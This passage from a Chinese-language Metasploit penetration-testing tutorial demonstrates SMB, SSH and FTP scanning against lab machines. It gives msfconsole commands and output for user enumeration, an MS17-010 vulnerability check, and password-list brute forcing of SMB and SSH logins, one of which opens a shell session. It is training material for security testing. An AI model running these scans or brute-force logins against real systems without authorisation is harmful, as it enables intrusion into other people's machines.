

2. SMB Share Enumeration 辅助模块在执行后渗透时也非常有用。通过提供有效的凭据，我们可以轻松枚举共享并列出文件：

![](img/6b6e557533100c0e47951d0e5e14c4ee_418_0.png)

Metasploit 有多个 SMB 扫描辅助模块。接下来我们将查看其中一些最有用的模块。

3. SMB Version Detection 辅助模块会显示每个目标系统的 SMB 版本：

```
msf > use auxiliary/scanner/smb/smb_version
msf auxiliary(smb_version) > set RHOSTS 192.168.216.10
RHOSTS => 192.168.216.10
msf auxiliary(smb_version) > run

[+] 192.168.216.10:445 - Host is running Windows 2008 R2 Standard SP1 (build:7601) (name:VAGRANT-2008R2)
(workgroup:WORKGROUP )
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(smb_version) >
```

4. SMB User Enumeration 辅助模块允许我们通过 SAM RPC 服务确定存在哪些本地用户：

```
msf > use auxiliary/scanner/smb/smb_enumusers
msf auxiliary(smb_enumusers) > set SMBPASS vagrant
SMBPASS => vagrant
msf auxiliary(smb_enumusers) > set SMBUSER vagrant
SMBUSER => vagrant
msf auxiliary(smb_enumusers) > set RHOSTS 192.168.216.10
RHOSTS => 192.168.216.10
msf auxiliary(smb_enumusers) > run

[+] 192.168.216.10:445 - VAGRANT-2008R2 [ Administrator, anakin_skywalker, arto_detoo, ben_kenobi, boba_fett, chewbacca, c_three_pio, darth_vader, greedo, Guest, han_solo, jabba_hutt, jarjar_binks, kylo_ren, lando_calrissian, leia_organa, luke_skywalker, sshd, sshd_server, vagrant ] ( LockoutTries=0 PasswordMin=0 )
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(smb_enumusers) >
```

5. SMB Login Check Scanner 辅助模块将测试一系列机器上的 SMB 登录并报告成功的登录：

```
msf > use auxiliary/scanner/smb/smb_login
msf auxiliary(smb_login) > set RHOSTS 192.168.216.10
RHOSTS => 192.168.216.10
msf auxiliary(smb_login) > set SMBUSER vagrant
SMBUSER => vagrant
msf auxiliary(smb_login) > set PASS_FILE /root/password.lst
PASS_FILE => /root/password.lst
msf auxiliary(smb_login) > run
...

[*] 192.168.216.10:445 - 192.168.216.10:445 - Domain is ignored for user vagrant
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(smb_login) >
```

6. MS17-010 SMB RCE Detection 辅助模块使用信息泄露来确定 MS17-010 是否已修补。具体来说，它连接到 IPC$ 树并尝试在 FID 0 上进行事务。如果返回的状态为 STATUS_INSUFF_SERVER_RESOURCES，则该机器没有 MS17-010 补丁。如果机器缺少 MS17-010 补丁，模块将检查是否存在现有的 DoublePulsar（ring 0 shellcode/恶意软件）感染。该模块在默认服务器配置下不需要有效的 SMB 凭据。它可以以用户 \ 的身份登录并连接到 IPC$：

```
msf > use auxiliary/scanner/smb/smb_ms17_010
msf auxiliary(smb_ms17_010) > set RHOSTS 192.168.216.10
RHOSTS => 192.168.216.10
msf auxiliary(smb_ms17_010) > run

[+] 192.168.216.10:445 - Host is likely VULNERABLE to
MS17-010! (Windows Server 2008 R2 Standard 7601 Service Pack 1)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(smb_ms17_010) >
```

7. Metasploit 有大量 SMB 辅助模块值得尝试。要列出所有可用的 SMB 模块，可以按 Tab 键显示 auxiliary/scanner/smb/ 下所有可用的模块：

```
msf > use auxiliary/scanner/smb/
...

use auxiliary/scanner/smb/smb_ms17_010
use auxiliary/scanner/smb/smb_uninit_cred
use auxiliary/scanner/smb/smb_version
msf > use auxiliary/scanner/smb/
```

## 使用 SSH Version Scanner 检测 SSH 版本

SSH 是一种广泛使用的应用程序，提供安全的远程登录。它使用强大的加密技术提供身份验证和保密性。在本教程中，我们将检测目标上当前运行的 SSH 版本。通过此 SSH Version Scanner，我们可以确定目标是否配备了任何易受攻击的 SSH 版本，如果是，我们可以继续下一步。

## 准备工作

之前的扫描显示目标系统上 TCP 端口 22 是开放的，因此我们将使用 SSH Version Scanner 辅助模块获取目标系统上运行的 SSH 版本信息。

## 如何操作...

+   1. 要扫描网络上的 SSH 服务器，请使用 `auxiliary/scanner/ssh/ssh_version` 辅助模块，设置 RHOSTS 中的目标地址范围，并将并发线程数设置为 256：

```
msf > use auxiliary/scanner/ssh/ssh_version
msf auxiliary(ssh_version) > set RHOSTS 192.168.216.0/24
RHOSTS => 192.168.216.0/24
msf auxiliary(ssh_version) > set THREADS 256
THREADS => 256
msf auxiliary(ssh_version) > run

...
[*] Scanned 133 of 256 hosts (51% complete)
[*] Scanned 232 of 256 hosts (90% complete)
[*] Scanned 250 of 256 hosts (97% complete)
[*] Scanned 255 of 256 hosts (99% complete)
[*] Scanned 256 of 256 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(ssh_version) >
```

因此，在我们的扫描中，我们在目标地址范围内发现了一些活动的 SSH 版本。一旦发现 SSH 版本，我们就可以为该特定版本搜索漏洞。

+   2. 要搜索默认或可猜测的凭据，可以使用 SSH Login Check Scanner 辅助模块测试一系列机器上的 SSH 登录并报告成功的登录：

```
msf > use auxiliary/scanner/ssh/ssh_login
msf auxiliary(ssh_login) > set USERNAME user
USERNAME => user
msf auxiliary(ssh_login) > set PASS_FILE /root/password.lst
PASS_FILE => /root/password.lst
msf auxiliary(ssh_login) > set RHOSTS 192.168.216.10,129
RHOSTS => 192.168.216.10,129
msf auxiliary(ssh_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
msf auxiliary(ssh_login) > set THREADS 256
THREADS => 256
msf auxiliary(ssh_login) > run
```

```
[*] Scanned 1 of 2 hosts (50% complete)
[+] 192.168.216.129:22 - Success: 'user:user' 'uid=1001(user) gid=1001(user) groups=1001(user) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '
[*] Command shell session 1 opened (192.168.216.5:39227 -> 192.168.216.129:22) at 2017-10-21 06:11:14 -0400
[*] Scanned 2 of 2 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(ssh_login) >
```

查看输出，我们很幸运地在 Metasploitable 2 目标机器上使用凭据 user:user 获得了会话。

+   3. 要与新会话交互，请使用 sessions 命令并带 -i 选项与会话交互并提供会话 ID，在本例中为 1：

```
msf auxiliary(ssh_login) > sessions -i 1
[*] Starting interaction with 1...
```

```
hostname
metasploitable
id
uid=1001(user) gid=1001(user) groups=1001(user)
```

## FTP 扫描

在本教程中，我们将使用 Metasploit 对网络中所有开放的 FTP 服务器进行版本扫描。

## 准备工作

FTP Version Scanner 辅助模块允许我们检测正在运行的 FTP 版本。

## 如何操作...

1. 要扫描网络上的 FTP 服务器，请使用 `auxiliary/scanner/ftp/ftp_version` 辅助模块，设置 RHOSTS 中的目标地址范围，并将并发线程数设置为 256：

```
msf > use auxiliary/scanner/ftp/ftp_version
msf auxiliary(ftp_version) > set RHOSTS 192.168.216.10,129
RHOSTS => 192.168.216.10,129
msf auxiliary(ftp_version) > set THREADS 256
THREADS => 256
msf auxiliary(ftp_version) > run

[+] 192.168.216.129:21 - FTP Banner: '220 (vsFTPd 2.3.4)\x0d\x0a'
[*] Scanned 1 of 2 hosts (50% complete)
[*] Scanned 2 of 2 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(ftp_version) >
```

2. 扫描结果，如同之前的辅助模块，将存储在 Metasploit 数据库中，可以使用 `services` 命令访问：

```
msf auxiliary(ftp_version) > services

Services
========

host port proto name state info
---- ---- ----- ---- ----- ----
192.168.216.129 21 tcp ftp open 220 (vsFTPd 2.3.4)\x0d\x0a

msf auxiliary(ftp_version) >
```

## SMTP 枚举

简单邮件传输协议（SMTP）服务有两个内部命令允许用户枚举：VRFY（确认有效用户名的名称）和 EXPN（揭示用户别名的实际地址以及电子邮件列表（邮件列表））。

